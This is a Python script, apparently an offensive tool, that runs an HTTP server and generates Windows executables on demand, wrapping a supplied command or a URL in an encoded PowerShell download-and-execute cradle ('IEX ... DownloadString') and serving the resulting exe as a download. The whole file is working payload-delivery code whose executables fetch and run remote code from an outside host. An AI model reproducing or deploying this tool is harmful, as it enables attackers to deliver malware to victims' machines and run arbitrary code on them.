from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse, urllib, winExecGen, sys, re, os, secrets, base64

class GetHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        print(parsed_path)
        executable_name = secrets.token_hex(8)+".exe"
        if "c="in parsed_path.query:
            winExecGen.encodePayload("./"+executable_name, urllib.parse.unquote(parsed_path.query.split("=",1)[-1]))
        elif "d=" in parsed_path.query:
            link = parsed_path.query.split("=",1)[-1]
            template = "IEX (New-Object Net.WebClient).DownloadString(\'"+link+"\');"
            print("template: "+template)
            full_command = "powershell -e "+powershell_encode(template)
            print("output: "+full_command)
            winExecGen.encodePayload("./"+executable_name, full_command)
        self.send_response(200)
        self.send_header("Content-Type", 'application/x-msdownload')
        with open(executable_name, 'rb') as f:
            fs = os.fstat(f.fileno())
            self.send_header("Content-Length", str(fs.st_size))
            self.send_header("Content-Disposition",'attachment; filename="'+executable_name+'"')
            self.end_headers()
            self.wfile.write(bytes(f.read()))
            print('hit')
            f.close()
            os.remove(executable_name)
        return

def powershell_encode(data):
    # blank command will store our fixed unicode variable
    blank_command = ""
    powershell_command = ""
    # Remove weird chars that could have been added by ISE
    n = re.compile(u'(\xef|\xbb|\xbf)')
    # loop through each character and insert null byte
    for char in (n.sub("", data)):
        # insert the nullbyte
        blank_command += char + "\x00"
    # assign powershell command as the new one
    powershell_command = blank_command
    # base64 encode the powershell command
    powershell_command = base64.b64encode(powershell_command.encode())
    return powershell_command.decode("utf-8")

if __name__ == '__main__':
    server_class = HTTPServer
    if len(sys.argv) != 3:
        print("usage: "+sys.argv[0]+" 1.3.3.7 8080, make request to http://1.3.3.7:8080/?c=powershell -e oirgjdfoigjdfgijdfgdfhgikhgfgihk, urlencode whatever you think will break it")
    server = server_class((sys.argv[1], int(sys.argv[2])), GetHandler)
    print('Starting server at http://'+sys.argv[1]+':'+sys.argv[2])
    server.serve_forever()
